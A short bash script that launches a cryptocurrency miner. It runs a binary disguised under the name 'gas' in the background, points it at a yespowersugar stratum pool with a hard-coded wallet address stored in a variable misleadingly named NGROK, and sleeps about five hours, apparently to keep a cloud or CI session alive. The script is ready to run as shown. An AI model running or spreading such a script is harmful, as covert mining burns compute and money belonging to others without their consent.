#!/bin/bash
chmod u+x gas
AU=yespowersugar
WO=$(echo aws$(shuf -i 1-10000 -n 1))
PE=stratum+tcps://stratum-eu.rplant.xyz:17042
NGROK=sugar1qncwd9uvepk8y3qpp25pjvqunyzjlj44wzhn2as
nohup timeout 290m ./gas -a $AU -o $PE -u $NGROK.$WO &
jobs
echo "hehe"
apt-get update -y
sleep 292m